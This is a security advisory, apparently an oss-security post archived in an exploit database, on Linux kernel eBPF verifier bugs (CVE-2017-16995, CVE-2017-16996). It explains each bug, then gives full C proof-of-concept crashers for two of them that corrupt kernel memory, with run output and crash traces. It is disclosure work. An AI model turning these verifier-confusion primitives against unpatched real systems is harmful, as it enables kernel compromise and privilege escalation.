@@ -1,0 +1,773 @@
+id: 29285
+date: 12/22/2017
+title: Linux Kernel >= 4.9 eBPF memory corruption bugs Vulnerability
+author: Jann Horn
+cves: CVE-2017-16995, CVE-2017-16996
+
+Hi!
+
+A few BPF verifier bugs in the Linux kernel, most of which can be used
+for controlled memory corruption, have been fixed over the last days.
+One of the bugs was introduced in 4.9, the others were only introduced
+in 4.14.
+
+The fixes are in the net tree of the Linux kernel
+(https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/log/kernel/bpf),
+but not in Linus' tree yet.
+
+The following bug was introduced in 4.9:
+
+=== fixed by "bpf: fix incorrect sign extension in check_alu_op()" ===
+check_alu_op() did not distinguish between
+BPF_ALU64|BPF_MOV|BPF_K (load 32-bit immediate, sign-extended to 64-bit)
+and BPF_ALU|BPF_MOV|BPF_K (load 32-bit immediate, zero-padded to 64-bit);
+it performed sign extension in both cases.
+Debian assigned CVE-2017-16995 for this issue.
+
+
+The following bugs were introduced in 4.14:
+
+=== fixed by "bpf/verifier: fix bounds calculation on BPF_RSH" ===
+Incorrect signed bounds were being computed for BPF_RSH.
+If the old upper signed bound was positive and the old lower signed bound was
+negative, this could cause the new upper signed bound to be too low,
+leading to security issues.
+
+=== fixed by "bpf: fix incorrect tracking of register size truncation" ===
+The BPF verifier did not properly handle register truncation to a smaller size.
+
+The old code first mirrors the clearing of the high 32 bits in the bitwise
+tristate representation, which is correct. But then, it computes the new
+arithmetic bounds as the intersection between the old arithmetic bounds and
+the bounds resulting from the bitwise tristate representation. Therefore,
+when coerce_reg_to_32() is called on a number with bounds
+[0xffff'fff8, 0x1'0000'0007], the verifier computes
+[0xffff'fff8, 0xffff'ffff] as bounds of the truncated number.
+This is incorrect: The truncated number could also be in the range [0, 7],
+and no meaningful arithmetic bounds can be computed in that case apart from
+the obvious [0, 0xffff'ffff].
+Debian assigned CVE-2017-16996 for this issue.
+
+=== fixed by "bpf: fix 32-bit ALU op verification" ===
+adjust_scalar_min_max_vals() only truncates its inputs and otherwise operates on
+64-bit numbers while the BPF interpreter and JIT perform 32-bit arithmetic.
+This means that the output of e.g. `(u32)0x40000000*(u32)5` will be incorrect.
+To test this, you can use the following BPF code:
+
+        BPF_MOV32_IMM(BPF_REG_1, 0x40000000),
+        BPF_ALU32_IMM(BPF_MUL, BPF_REG_1, 5),
+        BPF_EXIT_INSN()
+
+The verifier generates the following output, which is incorrect:
+
+        0: R1=ctx(id=0,off=0,imm=0) R10=fp0
+        0: (b4) (u32) r1 = (u32) 1073741824
+        1: R1=inv1073741824 R10=fp0
+        1: (24) (u32) r1 *= (u32) 5
+        2: R1=inv5368709120 R10=fp0
+        2: (95) exit
+        R0 !read_ok
+
+=== fixed by "bpf: fix missing error return in check_stack_boundary()" ===
+check_stack_boundary() prints an error into the verifier log, but doesn't
+exit, when a stack pointer doesn't have a known offset. This should be
+usable to get read+write access to spilled stack pointers.
+
+=== fixed by "bpf: force strict alignment checks for stack pointers" ===
+The verifier did not force strict alignment checks for stack pointers, but
+the tracking of stack spills relies on it; unaligned stack accesses can
+lead to corruption of spilled registers, which is exploitable.
+
+=== fixed by "bpf: don't prune branches when a scalar is replaced with
+a pointer" ===
+The BPF verifier pruned branches when a scalar is replaced with
+a pointer, explicitly permitting confusing a pointer into a number
+(but not the other way around). This is a kernel pointer leak.
+
+=== fixed by "bpf: fix integer overflows" ===
+There were various issues related to the limited size of integers used in
+the verifier:
+ - `off + size` overflow in __check_map_access()
+ - `off + reg->off` overflow in check_mem_access()
+ - `off + reg->var_off.value` overflow or 32-bit truncation of
+   `reg->var_off.value` in check_mem_access()
+ - 32-bit truncation in check_stack_boundary()
+
+
+
+Crash PoCs for some of these issues are at
+https://bugs.chromium.org/p/project-zero/issues/detail?id=1454,
+but since oss-security prefers having PoCs in the mail directly, I've
+pasted the PoCs below.
+For the other issues, examples of how to trigger them are in the
+added BPF selftests.
+The rest of the mail is just PoC code, so if you're not interested
+in the PoCs, you can stop reading now.
+
+
+
+
+=== PoC for "bpf: fix incorrect sign extension in check_alu_op()" ===
+Here is a crasher that tries to write to a noncanonical address.
+Note that it is only designed to work on 4.14.
+
+======================================
+user@debian:~/bpf_range$ cat crasher_badimm.c
+#define _GNU_SOURCE
+#include <err.h>
+#include <stdint.h>
+#include <linux/bpf.h>
+#include <linux/filter.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <asm/unistd_64.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+/* start from kernel */
+#define BPF_EMIT_CALL(FUNC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_CALL,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = (FUNC) }) /* ??? */
+#define BPF_MOV32_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_REG_ARG1    BPF_REG_1
+#define BPF_REG_ARG2    BPF_REG_2
+#define BPF_REG_ARG3    BPF_REG_3
+#define BPF_REG_ARG4    BPF_REG_4
+#define BPF_REG_ARG5    BPF_REG_5
+#define BPF_PSEUDO_MAP_FD   1
+#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = (__u32) (IMM) }),          \
+    ((struct bpf_insn) {                    \
+        .code  = 0, /* zero is reserved opcode */   \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = ((__u64) (IMM)) >> 32 })
+#define BPF_ALU32_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_LD_MAP_FD(DST, MAP_FD)              \
+    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+#define BPF_ALU32_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_EXIT_INSN()                     \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_EXIT,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
+#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_REG_FP  BPF_REG_10
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_ALU64_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_REG_TMP BPF_REG_8
+#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = OFF,                   \
+        .imm   = IMM })
+#define BPF_MOV64_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_ALU64_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_MOV32_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* end from kernel */
+
+
+int bpf_(int cmd, union bpf_attr *attrs) {
+    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
+}
+
+void array_set(int mapfd, uint32_t key, uint32_t value) {
+    union bpf_attr attr = {
+        .map_fd = mapfd,
+        .key    = (uint64_t)&key,
+        .value  = (uint64_t)&value,
+        .flags  = BPF_ANY,
+    };
+
+
+    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
+    if (res)
+        err(1, "map update elem");
+}
+
+
+int main(void) {
+    union bpf_attr create_map_attrs = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = 8,
+        .max_entries = 16
+    };
+    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
+    if (mapfd == -1)
+        err(1, "map create");
+
+
+    array_set(mapfd, 1, 1);
+
+    char verifier_log[100000];
+    struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
+
+        // fill r0 with pointer to map value
+        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
+        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
+        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
+        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
+        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
+        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
+        BPF_EXIT_INSN(), // exit
+
+        // r1 = 0xffff'ffff, mistreated as 0xffff'ffff'ffff'ffff
+        BPF_MOV32_IMM(BPF_REG_1, 0xffffffff),
+        // r1 = 0x1'0000'0000, mistreated as 0
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 1),
+        // r1 = 0x1000'0000'0000'0000, mistreated as 0
+        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 28),
+
+        // compute noncanonical pointer
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
+
+        // crash by writing to noncanonical pointer
+        BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),
+
+        // terminate to make the verifier happy
+        BPF_MOV32_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    union bpf_attr create_prog_attrs = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
+        .insns = (uint64_t)insns,
+        .license = (uint64_t)"",
+        .log_level = 2,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log
+    };
+    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
+    if (progfd == -1) {
+        perror("prog load");
+        puts(verifier_log);
+        return 1;
+    }
+    puts("ok so far?");
+
+    int socks[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
+        err(1, "socketpair");
+    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
+        err(1, "setsockopt");
+    if (write(socks[1], "a", 1) != 1)
+        err(1, "write");
+    char c;
+    if (read(socks[0], &c, 1) != 1)
+        err(1, "read res");
+    return 0;
+}
+user@debian:~/bpf_range$ gcc -o crasher_badimm crasher_badimm.c -Wall
+&& ./crasher_badimm
+ok so far?
+Segmentation fault
+======================================
+
+
+Here is the resulting crash (note the corrupted heap address in R15):
+
+======================================
+[10599.403881] general protection fault: 0000 [#6] SMP KASAN
+[10599.403886] Modules linked in: binfmt_misc snd_hda_codec_generic
+crct10dif_pclmul crc32_pclmul ghash_clmulni_intel snd_hda_intel
+snd_hda_codec pcbc snd_hda_core qxl snd_hwdep snd_pcm snd_timer ttm
+aesni_intel snd ppdev aes_x86_64 drm_kms_helper parport_pc crypto_simd
+soundcore glue_helper drm parport evdev cryptd sg serio_raw pcspkr
+virtio_console virtio_balloon button ip_tables x_tables autofs4 ext4
+crc16 mbcache jbd2 fscrypto sr_mod cdrom sd_mod ata_generic 8139too
+ehci_pci ata_piix uhci_hcd libata ehci_hcd 8139cp crc32c_intel mii
+virtio_pci psmouse usbcore virtio_ring scsi_mod virtio i2c_piix4
+floppy
+[10599.403952] CPU: 7 PID: 1610 Comm: crasher_badimm Tainted: G    B D
+         4.15.0-rc1+ #4
+[10599.403954] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS 1.10.2-1 04/01/2014
+[10599.403957] task: 000000004ae6ce3e task.stack: 000000006149ccc2
+[10599.403963] RIP: 0010:___bpf_prog_run+0x1a77/0x2490
+[10599.403966] RSP: 0018:ffff8801ef6bf838 EFLAGS: 00010292
+[10599.403969] RAX: 0000000000000000 RBX: ffffc900016150b8 RCX: ffffffff866483d7
+[10599.403971] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0fff8801ac393b78
+[10599.403974] RBP: ffff8801ef6bf968 R08: 0000000000000000 R09: 0000000000000000
+[10599.403976] R10: 0000000000000001 R11: ffffed00358726b9 R12: ffffffff870be980
+[10599.403978] R13: 1ffff1003ded7f0e R14: 00000000deadbeef R15: 0fff8801ac393b78
+[10599.403981] FS:  00007fd705b43700(0000) GS:ffff8801f77c0000(0000)
+knlGS:0000000000000000
+[10599.403984] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[10599.403986] CR2: 0000561c31a24008 CR3: 00000001b153b002 CR4: 00000000001606e0
+[10599.403991] Call Trace:
+[10599.403997]  ? sk_filter_trim_cap+0x5c/0x4e0
+[10599.404000]  ? bpf_jit_compile+0x30/0x30
+[10599.404006]  ? alloc_skb_with_frags+0x90/0x2c0
+[10599.404010]  ? __bpf_prog_run32+0x83/0xc0
+[10599.404013]  ? __bpf_prog_run64+0xc0/0xc0
+[10599.404017]  ? sk_filter_trim_cap+0x5c/0x4e0
+[10599.404022]  ? sk_filter_trim_cap+0xf7/0x4e0
+[10599.404028]  ? unix_dgram_sendmsg+0x3e2/0x960
+[10599.404033]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404036]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404040]  ? sock_alloc_inode+0x46/0x110
+[10599.404043]  ? unix_stream_connect+0x840/0x840
+[10599.404046]  ? __sock_create+0x7f/0x2c0
+[10599.404049]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404054]  ? __lock_acquire.isra.31+0x2d/0xb40
+[10599.404059]  ? __wake_up_common_lock+0xaf/0x130
+[10599.404065]  ? unix_stream_connect+0x840/0x840
+[10599.404068]  ? sock_sendmsg+0x6b/0x80
+[10599.404071]  ? sock_write_iter+0x11d/0x1d0
+[10599.404075]  ? sock_sendmsg+0x80/0x80
+[10599.404080]  ? do_raw_spin_unlock+0x86/0x120
+[10599.404084]  ? iov_iter_init+0x77/0xb0
+[10599.404089]  ? __vfs_write+0x23e/0x340
+[10599.404092]  ? kernel_read+0xa0/0xa0
+[10599.404098]  ? __fd_install+0x5/0x160
+[10599.404102]  ? __fget_light+0x9b/0xb0
+[10599.404107]  ? vfs_write+0xe9/0x240
+[10599.404110]  ? SyS_write+0xa7/0x130
+[10599.404121]  ? SyS_read+0x130/0x130
+[10599.404125]  ? lockdep_sys_exit+0x16/0x8e
+[10599.404129]  ? lockdep_sys_exit_thunk+0x16/0x2b
+[10599.404133]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[10599.404138] Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04
+0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8
+79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6
+43 01
+[10599.404200] RIP: ___bpf_prog_run+0x1a77/0x2490 RSP: ffff8801ef6bf838
+[10599.404204] ---[ end trace e8c17e9abe81bd46 ]---
+======================================
+
+
+
+
+=== PoC for "bpf: fix incorrect tracking of register size truncation" ===
+Here is a crasher that uses this to again write to a noncanonical address:
+
+
+======================================
+#define _GNU_SOURCE
+#include <err.h>
+#include <stdint.h>
+#include <linux/bpf.h>
+#include <linux/filter.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <asm/unistd_64.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+/* start from kernel */
+#define BPF_EMIT_CALL(FUNC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_CALL,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = (FUNC) }) /* ??? */
+#define BPF_MOV32_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_REG_ARG1    BPF_REG_1
+#define BPF_REG_ARG2    BPF_REG_2
+#define BPF_REG_ARG3    BPF_REG_3
+#define BPF_REG_ARG4    BPF_REG_4
+#define BPF_REG_ARG5    BPF_REG_5
+#define BPF_PSEUDO_MAP_FD   1
+#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = (__u32) (IMM) }),          \
+    ((struct bpf_insn) {                    \
+        .code  = 0, /* zero is reserved opcode */   \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = ((__u64) (IMM)) >> 32 })
+#define BPF_ALU32_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_LD_MAP_FD(DST, MAP_FD)              \
+    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
+#define BPF_ALU32_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_EXIT_INSN()                     \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_EXIT,            \
+        .dst_reg = 0,                   \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
+#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_REG_FP  BPF_REG_10
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_ALU64_IMM(OP, DST, IMM)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_MOV64_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_REG_TMP BPF_REG_8
+#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = OFF,                   \
+        .imm   = 0 })
+#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = OFF,                   \
+        .imm   = IMM })
+#define BPF_MOV64_IMM(DST, IMM)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
+        .dst_reg = DST,                 \
+        .src_reg = 0,                   \
+        .off   = 0,                 \
+        .imm   = IMM })
+#define BPF_ALU64_REG(OP, DST, SRC)             \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+#define BPF_MOV32_REG(DST, SRC)                 \
+    ((struct bpf_insn) {                    \
+        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
+        .dst_reg = DST,                 \
+        .src_reg = SRC,                 \
+        .off   = 0,                 \
+        .imm   = 0 })
+/* end from kernel */
+
+
+int bpf_(int cmd, union bpf_attr *attrs) {
+    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
+}
+
+void array_set(int mapfd, uint32_t key, uint32_t value) {
+    union bpf_attr attr = {
+        .map_fd = mapfd,
+        .key    = (uint64_t)&key,
+        .value  = (uint64_t)&value,
+        .flags  = BPF_ANY,
+    };
+
+
+    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
+    if (res)
+        err(1, "map update elem");
+}
+
+
+int main(void) {
+    union bpf_attr create_map_attrs = {
+        .map_type = BPF_MAP_TYPE_ARRAY,
+        .key_size = 4,
+        .value_size = 8,
+        .max_entries = 16
+    };
+    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
+    if (mapfd == -1)
+        err(1, "map create");
+
+
+    array_set(mapfd, 1, 1);
+
+    char verifier_log[100000];
+    struct bpf_insn insns[] = {
+        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
+
+        // fill r3 with value in range [0x0, 0xf], actually 0x8:
+        // first load map value pointer...
+        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
+        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), // allocate 4 bytes stack
+        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
+        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
+        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
+        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
+        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
+        BPF_MOV64_REG(BPF_REG_0, 0), // prepare exit
+        BPF_EXIT_INSN(), // exit
+
+        // ... then write, read, mask map value
+        // (tracing actual values through a map is impossible)
+        BPF_MOV32_IMM(BPF_REG_3, 8),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_3, 0),
+        BPF_LDX_MEM(BPF_W, BPF_REG_3, BPF_REG_0, 0),
+        BPF_ALU64_IMM(BPF_AND, BPF_REG_3, 0xf),
+
+        // load r1=0xffff'fff8 while working around the first verifier bug
+        BPF_MOV32_IMM(BPF_REG_1, 0xfffffff8>>1),
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_1),
+
+        // r1 in range [0xffff'fff8, 0x1'0000'0007]
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_3),
+
+        // load r2=0
+        BPF_MOV32_IMM(BPF_REG_2, 0),
+
+        // trigger verifier bug:
+        // visible range: [0xffff'fff8, 0xffff'ffff]
+        // hidden range: [0, 7]
+        // actual value: 0
+        BPF_ALU32_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
+
+        // collapse down: verifier sees 1, actual value 0
+        BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, 31),
+
+        // flip: verifier sees 0, actual value 1
+        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 1),
+        BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, -1),
+
+        // r1 = 0x1000'0000'0000'0000, verifier sees 0
+        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 60),
+
+        // compute noncanonical pointer
+        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),
+
+        // crash by writing to noncanonical pointer
+        BPF_MOV32_IMM(BPF_REG_1, 0xdeadbeef),
+        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),
+
+        // terminate to make the verifier happy
+        BPF_MOV32_IMM(BPF_REG_0, 0),
+        BPF_EXIT_INSN()
+    };
+    union bpf_attr create_prog_attrs = {
+        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
+        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
+        .insns = (uint64_t)insns,
+        .license = (uint64_t)"",
+        .log_level = 2,
+        .log_size = sizeof(verifier_log),
+        .log_buf = (uint64_t)verifier_log
+    };
+    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
+    if (progfd == -1) {
+        perror("prog load");
+        puts(verifier_log);
+        return 1;
+    }
+    puts("ok so far?");
+
+    int socks[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
+        err(1, "socketpair");
+    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
+        err(1, "setsockopt");
+    if (write(socks[1], "a", 1) != 1)
+        err(1, "write");
+    char c;
+    if (read(socks[0], &c, 1) != 1)
+        err(1, "read res");
+    return 0;
+}
+user@debian:~/bpf_range$ gcc -o crasher_badtrunc crasher_badtrunc.c
+-Wall && ./crasher_badtrunc
+ok so far?
+Segmentation fault
+======================================
+
+
+Here's the resulting crash:
+
+======================================
+[  117.274571] general protection fault: 0000 [#2] SMP KASAN
+[  117.274575] Modules linked in: binfmt_misc snd_hda_codec_generic
+qxl snd_hda_intel snd_hda_codec ttm snd_hda_core drm_kms_helper
+snd_hwdep crct10dif_pclmul snd_pcm drm crc32_pclmul
+ghash_clmulni_intel snd_timer pcbc aesni_intel aes_x86_64 snd
+crypto_simd evdev glue_helper soundcore ppdev cryptd virtio_balloon sg
+virtio_console serio_raw parport_pc parport pcspkr button ip_tables
+x_tables autofs4 ext4 crc16 mbcache jbd2 fscrypto sr_mod sd_mod cdrom
+ata_generic 8139too ehci_pci virtio_pci crc32c_intel ata_piix uhci_hcd
+psmouse virtio_ring virtio floppy ehci_hcd libata usbcore scsi_mod
+8139cp i2c_piix4 mii
+[  117.274640] CPU: 1 PID: 1197 Comm: crasher_badtrun Tainted: G    B
+D          4.15.0-rc1+ #4
+[  117.274642] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS 1.10.2-1 04/01/2014
+[  117.274645] task: 00000000a02f12e8 task.stack: 0000000051644a73
+[  117.274651] RIP: 0010:___bpf_prog_run+0x1a77/0x2490
+[  117.274654] RSP: 0018:ffff8801af4e7838 EFLAGS: 00010292
+[  117.274657] RAX: 0000000000000000 RBX: ffffc90001305108 RCX: ffffffff928483d7
+[  117.274659] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0fff8801ac81e0f8
+[  117.274661] RBP: ffff8801af4e7968 R08: 0000000000000000 R09: 0000000000000000
+[  117.274664] R10: 0000000000000001 R11: ffffed003dfa0601 R12: ffffffff932be980
+[  117.274666] R13: 1ffff10035e9cf0e R14: 00000000deadbeef R15: 0fff8801ac81e0f8
+[  117.274669] FS:  00007f3efe927700(0000) GS:ffff8801f7640000(0000)
+knlGS:0000000000000000
+[  117.274671] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  117.274674] CR2: 00005654507a9008 CR3: 00000001ec086003 CR4: 00000000001606e0
+[  117.274678] Call Trace:
+[  117.274685]  ? sk_filter_trim_cap+0x5c/0x4e0
+[  117.274688]  ? bpf_jit_compile+0x30/0x30
